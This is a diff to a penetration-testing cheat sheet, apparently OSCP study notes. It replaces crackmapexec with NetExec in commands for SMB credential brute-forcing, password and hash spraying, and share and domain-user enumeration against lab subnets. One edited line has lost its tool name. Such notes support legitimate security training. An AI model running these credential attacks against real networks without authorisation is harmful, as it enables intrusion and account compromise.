@@ -116,11 +116,11 @@ If we specify the zone to the tool (or leave it empty for the default zone), we 
 - `smbclient \\\\$ip\\$share`  
 - `smbmap -H <IPAddress>`  
 - `nbtscan`  
-- `crackmapexec smb 10.11.1.1/24`
+- ` smb 10.11.1.1/24`
 - Null connect:
   `rpcclient -U "" 10.10.10.10` 
-- Try known creds on targets: `crackmapexec smb 10.11.1.1/24 -u Administrator -p 99bbVDdorGzfZJun`  
-- Bruteforcing: `crackmapexec smb 10.11.1.1/24 -u /ville/Desktop/OSCP/PWK/users.txt -p /ville/Desktop/OSCP/PWK/pws.txt`  
+- Try known creds on targets: `nxc smb 10.11.1.1/24 -u Administrator -p 99bbVDdorGzfZJun`  
+- Bruteforcing: `nxc smb 10.11.1.1/24 -u /ville/Desktop/OSCP/PWK/users.txt -p /ville/Desktop/OSCP/PWK/pws.txt`  
 - Check accessible shares in network with specific domain account:   
   `# smbmap -d <domain> -u <username> -p <password> --host-file files/smbhosts.txt`  
 - Search for sensitive data on shares with smbmap:   
@@ -405,7 +405,7 @@ PHP:
 ### MySQL command line
 - using found credentials:   
   ` mysql -uroot -p<pass> -e 'show databases;'`   
-## crackmapexec
+## crackmapexec (Use NetExec instead!)
 - "hash spraying" (in this case with local administrator)  
    `cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth` 
 - Share enumeration with credentials:  
@@ -417,6 +417,13 @@ PHP:
   $ export KRB5CCNAME=/home/testuser/impacket/administrator.ccache 
   $ cme smb zoro.gold.local --use-kcache
   ```
+
+## NetExec
+List readable or writable share:   
+`#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE`   
+
+Enumerate domain users on the remote target:   
+`nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users`   
   
 ## Password Spraying
 - Using Kerbrute:   
